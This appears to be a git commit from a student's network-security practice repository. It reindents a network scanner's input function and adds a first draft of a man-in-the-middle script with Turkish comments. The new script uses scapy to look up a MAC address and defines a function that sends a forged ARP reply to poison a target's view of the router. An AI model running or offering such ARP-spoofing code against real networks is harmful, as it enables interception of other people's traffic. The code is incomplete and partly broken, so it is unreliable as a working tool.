91f8276a98461fc464eb6d8a305eaadfcceb7f8b
Ebubekir Dogan <ebubekir.dogan@bil.omu.edu.tr>
2022-06-05 21:19:19 +0300

    man in the middle updated

--- 8-Net-Scanner/my_net_scanner.py
+++ 8-Net-Scanner/my_net_scanner.py
@@ -9,12 +9,12 @@ import optparse as opt
 
 
 def get_user_input():
-        parse_object = opt.OptionParser()
-        parse_object.add_option("-i","--ipaddress",dest="ip_address",help="interface to change")
-        (user_input,arguments) = parse_object.parse_args()
-        if not user_input.ip_address:
-            print("Enter Ip Address")
-        return user_input
+    parse_object = opt.OptionParser()
+    parse_object.add_option("-i","--ipaddress",dest="ip_address",help="interface to change")
+    (user_input,arguments) = parse_object.parse_args()
+    if not user_input.ip_address:
+        print("Enter Ip Address")
+    return user_input
     
 
 def scan_my_network(ip):
---
+++ 9- Man-In-The-Middle/my_man_in_the_middle.py
@@ -0,0 +1,21 @@
+import scapy.all as scapy
+
+
+#Mac Adresini alıyoruz bu fonksiyonla
+def get_mac_addres(ip):
+    arp_request_packet = scapy.ARP(pdst=ip)
+    #scapy.ls(scapy.ARP())
+    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    #scapy.ls(scapy.Ether())
+    combined_packet = broadcast_packet / arp_request_packet
+    answered_list = scapy.srp(combined_packet,timeout=1)[0]
+    print(list(answered_list[0][0]))
+    answered_list.summary() 
+    
+def arp_poisoning(target_ip,poisoned_ip):
+    #poisoned ip dedigimiz sey modem veya router ip sidir.
+    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst="18-56-80-B9-D6-3D",psrc=poisoned_ip)
+    scapy.send(arp_response)
+    
+    
+get_mac_addres("192.168.1.101")
